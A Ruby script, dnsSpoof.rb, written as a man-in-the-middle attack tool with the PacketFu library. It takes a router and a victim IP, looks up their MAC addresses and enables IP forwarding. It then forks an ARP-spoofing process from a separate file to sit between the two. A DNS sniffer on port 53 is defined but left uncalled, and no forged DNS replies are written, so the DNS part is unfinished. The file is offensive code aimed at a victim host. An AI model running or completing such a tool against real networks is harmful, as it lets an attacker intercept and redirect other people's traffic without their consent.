=begin
 File: dnsSpoof.rb
 Author: Luke Queenan
=end

# Gems
require 'rubygems'
require 'packetfu'

# Files
require './arpSpoof.rb'

# Includes so we don't have to use fully qualified class names
include PacketFu

class DnsSpoof
    
    # Initialize the variables and information
    def initialize (routerIP, victimIP, interface)
        
        # Check for values
        if routerIP == nil || victimIP == nil || interface == nil
            puts "Usage: routerIP victimIP interface\n"
            exit
        end
        
        # Store global info
        @routerIP = routerIP
        @victimIP = victimIP
        @interface = interface
        
        # Get the MAC address of the router
        @routerMAC = Utils.arp(routerIP, :iface => @interface)
        
        # Get the MAC address of the victim
        @victimMAC = Utils.arp(victimIP, :iface => @interface)
        
        # Get our information
        @ourInfo = Utils.whoami?(:iface => interface)
        
        # Enable IP forwarding based on the OS (Linux or OS X)
        DnsSpoof.forward(true);
    end
    
    def main
        
        # Create the ARP Spoofing process
        @pid = fork do
            # Ensure that we shut down the child cleanly
            Signal.trap("INT") { DnsSpoof.forward(false); exit }
            arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                               @interface, @ourInfo)
            arp.main
        end
        
        # Make sure we shut down cleanly
        Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
        
        # Start DNS portion of program
        #sniffPackets
        Process.wait
        
    end

private    
    
    def sniffPackets
        
        # Start the capture process
        capture = Capture.new(:iface => @interface, :start => true,
                                        :promisc => true,
                                        :filter => "udp and port 53",
                                        :save => true)
        
        # Find the DNS packets
        capture.stream.each do |pkt|
            packet = Packet.parse(pkt)
        end
        
        
    end
    
    
    # Function for enabling packet forwarding based on OS type
    def DnsSpoof.forward(forward)
        
        if RUBY_PLATFORM =~ /darwin/
            if forward then
                `sysctl -w net.inet.ip.forwarding=1`
            end
            
            if !forward then
                `sysctl -w net.inet.ip.forwarding=0`
            end
        else
            if forward then
                `echo 1 > /proc/sys/net/ipv4/ip_forward`
            end
            
            if !forward then
                `echo 0 > /proc/sys/net/ipv4/ip_forward`
            end
        end
    end
end

spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
spoof.main
